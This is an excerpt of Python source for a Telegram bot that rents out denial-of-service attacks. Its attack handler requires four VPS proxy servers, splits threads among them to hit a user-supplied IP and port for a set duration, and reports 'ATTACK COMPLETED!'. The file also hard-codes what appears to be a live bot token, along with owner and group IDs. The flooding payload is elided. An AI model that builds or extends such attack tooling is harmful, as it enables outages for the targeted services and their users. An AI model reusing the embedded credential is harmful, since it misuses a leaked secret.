...
TELEGRAM_BOT_TOKEN = '7327182448:AAHTi3bnXOvV54QGnlhIwdYW-D8RsSGFXIU'
OWNER_USERNAME = "MRNBOWNER"
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "MRNBOWNER"
ALLOWED_GROUP_IDS = [-1002611062988]
MAX_THREADS = 500
max_duration = 600
bot_open = False
...
OWNER_ID = 7770877438  # Your user ID
COOWNER_IDS = [7770877438]  # Other admin IDs
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    # Require exactly 4 VPS to be available
    if len(available_vps) < 4:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        await update.message.reply_text(
            "❌ *Not enough servers available! Need 4 servers for this attack.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    ...
    # Calculate threads per VPS (divide equally among 4 VPS)
    threads_per_vps = threads // 4
    remaining_threads = threads % 4
    ...
    start_message = await update.message.reply_text(
        ...
        f"🧵 *Total Power*: {threads} threads (4 VPS)\n"
        f"🖥️ *Using*: 4 Squid Proxy Servers\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
                    ...
                    asyncio.run_coroutine_threadsafe(
                        context.bot.send_message(
                            ...
                            text=f"✅ *Attack Finished!*\n"
                                 f"🎯 *Target*: {ip}:{port}\n"
                                 f"🕒 *Duration*: {duration} sec\n"
                                 f"🧵 *Total Power*: {threads} threads power\n"
                                 f"👑 *Bot Owner:* {current_display_name}\n\n"
                                 f"🔥 *ATTACK COMPLETED!*",
                            parse_mode='Markdown'
                        ),
    ...
    try:
        # Start a thread for each of the 4 VPS
        for i, vps in enumerate(selected_vps[:4]):
